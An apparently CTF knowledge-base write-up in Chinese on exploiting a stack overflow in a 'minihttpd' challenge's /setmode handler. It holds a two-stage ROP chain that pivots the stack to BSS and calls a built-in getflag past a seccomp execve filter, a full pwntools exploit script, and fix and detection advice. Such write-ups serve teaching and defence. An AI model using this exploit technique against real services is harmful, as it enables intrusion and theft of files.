---
id: binary-pwn-stack-minihttpd-setmode-overflow-ret2getflag
title: minihttpd POST /setmode 值拷贝栈溢出：recv 二阶段写 BSS + 调内置 getflag 读 /flag
type: scenario
domain: binary
path: binary/pwn/stack
technique: http-setmode-value-copy-overflow-ret2getflag
aliases:
- minihttpd setmode 栈溢出
- /setmode 栈溢出
- 内置 getflag ROP
- recv 二阶段写 BSS
- HTTP 服务栈溢出读 flag
- seccomp 禁 execve 调 getflag
tags:
- pwn
- stack-overflow
- rop
- http
- seccomp
- getflag
- bss
- recv
- no-pie
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:32+08:00'
  notes: 已对照原文 setmode 源码、getflag 与 EXP 核对；修正 BSS 地址/栈对齐表述；PoC 未复跑。
---

## 一句话结论

多线程 mini HTTP 服务在处理 POST `/setmode` 的 `key=value` 时，把 `=` 后的值按请求 body 长度 `memcpy` 到 0x10 字节栈缓冲区，形成栈溢出；在无 PIE、seccomp 仅杀 `execve/execveat` 的环境里，可先用 ROP 设好 `rdi=fd`、`rsi=BSS` 和 saved rbp=BSS，跳到程序内部一个 `mov rdx,rax; call recv` 调用点，把第二段数据（`"/flag"` 字符串加后续链）读入 BSS，再由该函数的 `leave; ret` 把栈切到 BSS，调用程序自带的 `getflag(fd, "/flag")`，直接把 flag 写回客户端。

## 原理

- **溢出点**：`/setmode` 路由注册到 `sub_402A40`，handler 调用约定为 `handler(fd, body, body_len)`。函数用 `strchr` 找 `=`：`n = '=' - body`，`n_1 = body_len - n - 1`；先把 `=` 前的 key 拷到 `dest` 并与 `"setmode"` 比较，通过后把 `=` 后的 value 用 `memcpy(ptr, eq + 1, n_1)` 拷入只有 0x10 字节的 `ptr`。`n_1` 完全取自请求长度，未与 `sizeof(ptr)` 比较，因此长 value 直接覆盖栈上的 saved rbp 和返回地址。payload 以 `setmode=` 开头即可让 key 校验通过。
- **地址固定**：二进制未开 PIE，`pop rdi; ret`（0x402FF3）、`pop rsi; pop r15; ret`（0x402FF1）、`pop rbp; ret`（0x40169D）、`getflag`（0x402663）与 BSS/堆地址都可硬编码；原文环境为 libc 2.31。
- **seccomp 只禁 execve**：初始化使用 `seccomp_init(SCMP_ACT_ALLOW)`，只对 `execve(59)`、`execveat(322)` 加 KILL，其余 syscall 放行。因此 `system("/bin/sh")` 不可用，但 `open/read/write`、`fopen/fread/send` 都可用，目标从 getshell 变为“把 flag 读出来”。
- **内置 getflag 是最短路径**：`sub_402663(fd, filename)` 等价于 `fopen(filename, "r")` → 循环 `fread` → `send(fd, buf, n, 0)` → `fclose` → `shutdown(fd, 1)` → `close(fd)`。只要控制 `rdi=fd`、`rsi=filename` 就能读任意文件并回写 socket，不必自己拼 open/read/write，也不依赖 libc 偏移；文件名必须位于可读的固定地址。
- **二阶段写 BSS**：第一段 ROP 不把 `"/flag"` 和完整链放在栈上，而是把 saved rbp 设为 BSS，再跳到程序已有的 recv 调用点 `0x401CF0: mov ecx, 0; mov rdx, rax; call _recv`。在 ROP 里用 `pop rsi; pop r15; ret` 设 `rsi=BSS`、`pop rdi; ret` 设 `rdi=fd`；该调用点不显式设置长度，而是用 `rax` 作为 `recv` 的 `n`，原文的链依赖 setmode 处理函数返回后残留的 `rax`（量级与发送的 value 长度一致，足够大；`recv` 有数据就返回，不会等满）。随后发送第二段 `"/flag\0\0\0" + ROP 链`，被写入 BSS。换目标时应先确认 `rax` 在进入调用点时的确切来源。
- **recv 后的 leave; ret 完成迁移**：调用点所在函数返回时执行 `leave; ret`，而 rbp 已被设为 BSS：`rsp = BSS`，`pop rbp` 吃掉 BSS 前 8 字节（正好是 `"/flag\0\0\0"`），`ret` 从 BSS+8 取第一个 gadget。于是第二段链在 BSS 上执行：`pop rsi; pop r15; ret` → `rsi=BSS`（指向 `/flag`）、`r15=0`；`pop rdi; ret` → `rdi=fd`；最后 `getflag` 打开 `/flag` 并把内容 `send` 回该 fd。
- **栈对齐**：原文第一次尝试卡在 `snprintf`，vmmap 后把 BSS 改为 0x427000，并依靠 `pop rdi` 与 recv 调用点之间的 `ret`（0x402FF4，即 `pop rdi; ret` 的第二个字节）做栈对齐后成功。x86-64 的 `call` 要求 16 字节对齐，ROP 进入函数前多一个 `ret` 可修正 `rsp % 16`。原文猜测旧地址“不可写”，但 vmmap 显示 0x406880 所在页实际可写，真正的问题是栈/帧未对齐；最终改用 0x427000 后链才走通。
- **为什么可行**：溢出长度足够覆盖 saved rbp/返回地址；无 PIE 使 BSS 与 gadget 固定；seccomp 只禁 execve，保留了文件读写系统调用；程序自身带有“读文件并回写”的完整函数，攻击者不必构造新能力，只需把参数摆对。

## 触发条件

- 目标是每连接 `pthread_create` 的 HTTP 服务，POST body 按 `key=value` 解析，value 拷贝长度来自请求长度且未与栈缓冲区容量比较。
- 二进制非 PIE（或已泄露代码基址），能确定 gadget、`getflag` 与可写 BSS/堆地址；NX 开启（用 ROP，不靠 shellcode）。
- seccomp 只禁止 `execve/execveat`（或至少允许 `open/read/write`、`recv/send`）；若连文件读取也被禁，此路径不成立。
- 程序内存在“打开指定路径并写回 fd”的 helper（如 getflag），或可用等价 gadget 拼出 open/read/write。
- 存在寄存器可控的 `recv`/`read` 调用点（rdi/rsi 可控，长度 rdx/rax 可接受），且该调用点所在函数以 `leave; ret` 收尾；有可写、地址固定的 BSS/堆区域。
- 客户端能发送含任意字节的原始 body（按 Content-Length 读取，不因 NUL 截断），并保持连接以接收回写。

## 利用步骤

1. 逆向下发路由表与 POST 解析：确认 `/setmode` → `sub_402A40`，body 格式为 `POST /setmode\r\nContent-Length: N\r\n\n` 后跟 `setmode=<value>`；确认 0x10 缓冲区、0x440 到 saved rbp 的偏移与 `getflag` 地址。
2. 选可写的第二阶段地址 `bss`（原文最终用 0x427000；0x406880 的尝试因对齐/映射问题失败），规划第二段链布局。
3. 第一段 payload：`b"setmode=" + b"a"*0x440 + p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(pop_rdi) + p64(fd) + p64(ret) + p64(recv_callsite)`；其中第一个 `p64(bss)` 是 saved rbp，`p64(ret)` 只做栈对齐。
4. 发送 POST 请求（Content-Length 为第一段长度），紧接着发送第二段：`b"/flag\x00\x00\x00" + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(pop_rdi) + p64(fd) + p64(getflag)`。第一段的 recv 把第二段读入 bss；随后 `leave; ret` 以 bss 为栈，`pop rbp` 吃掉 `/flag` 字符串，`ret` 进入 bss+8 的链，最终调用 `getflag(fd, bss)` 读取 `/flag`。
5. 从同一 socket 读取 flag；若卡住或崩溃，依次核对：recv 的 rax 长度是否合理、`bss` 是否落在可写映射内、`call` 前 `rsp % 16` 是否对齐、`fd` 是否为目标连接。
6. 多连接变体见 [[binary-pwn-stack-multithread-http-cross-connection-bss-reuse]]。

## PoC

原文关键脚本（地址为原题示例，未在本机复跑；`bss=0x427000` 为最终成功值）：

```python
from pwn import *
context.arch = 'amd64'

pop_rdi       = 0x402ff3   # pop rdi ; ret
pop_rsi_r15   = 0x402ff1   # pop rsi ; pop r15 ; ret
ret           = 0x402ff4   # 对齐用 ret（pop rdi; ret 的第二个字节）
recv_callsite = 0x401cf0   # mov ecx,0 ; mov rdx,rax ; call _recv
getflag       = 0x402663   # fopen(filename,"r") -> fread -> send(fd,...)
bss           = 0x427000
fd            = 4          # 按实际连接调整

post = b'POST /setmode\r\nContent-Length: %d\r\n\n'

stage1  = b'setmode=' + b'a' * 0x440
stage1 += p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0)
stage1 += p64(pop_rdi) + p64(fd) + p64(ret) + p64(recv_callsite)

stage2  = b'/flag\x00\x00\x00'
stage2 += p64(pop_rsi_r15) + p64(bss) + p64(0)
stage2 += p64(pop_rdi) + p64(fd) + p64(getflag)

p = remote('localhost', 9999)
p.send(post % len(stage1) + stage1 + stage2)
p.interactive()
```

要点：`stage1` 的 `Content-Length` 只算第一段；第二段是紧跟其后的原始字节，由 recv 调用点读入 BSS。`stage2` 开头的 `/flag\0\0\0` 同时充当 `leave` 弹出后丢弃的 saved rbp 槽位，所以链从 `bss+8` 开始。

## 变体与关联

- 变体：若没有 getflag，可改用 `open/read/write` 的 ORW 链（seccomp 允许时），或跳到 `fopen/fread/send` 调用点；核心仍是“先写 BSS 再迁移”。
- 变体：用 `read` 调用点代替 recv；用 `pop rsp`/`xchg rsp, rax` 等 pivot gadget 代替 recv 后的 `leave; ret`。
- 变体：把第二阶段写到堆或其他固定可写区，只要地址可预测且 `leave` 能落到链上。
- 变体：多线程/多连接共享 BSS，把字符串布置与利用拆到两条连接（见关联卡）。
- 关联：[[binary-pwn-rop-magic-gadget-csu-bss-write-orw-no-libc-leak]]（同一 minihttpd 题的另一解法：magic gadget + CSU 逐 dword 加写 BSS 后调 fopen/fread/send，避免 recv 的寄存器/栈帧问题）；[[binary-pwn-stack-pivot-leave-ret-bss]]（leave;ret 栈迁移基础）；[[binary-pwn-stack-http-uri-unescape-overflow-stack-leak-shellcode]]（另一种自制 HTTP 服务栈溢出）；[[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]（BSS 迁移 + 分块写链）。
- 边界：原文说“多个线程公用一个栈”并不准确——线程各有独立栈，真正共享的是 BSS/全局区和进程生命周期；单连接解法还依赖第一段 recv 的 rax 长度来源与函数收尾恰好是 `leave; ret`，换二进制需重新确认。

## 检测与防御

- 修复：`memcpy` 长度必须与 `ptr` 容量比较（`min(n_1, sizeof(ptr)-1)`），并校验 `Content-Length` 与实际 body 长度、拒绝超长 value；配置接口使用 `snprintf`/`strlcpy`。
- 编译加固：开启 Canary、PIE、Full RELRO、NX、CET/Shadow Stack，消除固定 BSS 与返回地址覆盖。
- 沙箱：只禁 `execve` 不能阻止读文件；对 flag/敏感文件用 Landlock/openat2 `RESOLVE_BENEATH` 限定路径，或让进程无权限读取；不要把“读文件并 send”的调试函数留在生产二进制。
- 检测：POST `/setmode` 出现远超字段容量的 body、崩溃时 RSP 落在 BSS/堆、调用栈出现 `leave; ret`/`getflag`/`send` 异常序列；网络侧观察同一连接发送第一段后紧跟二进制第二段的行为。
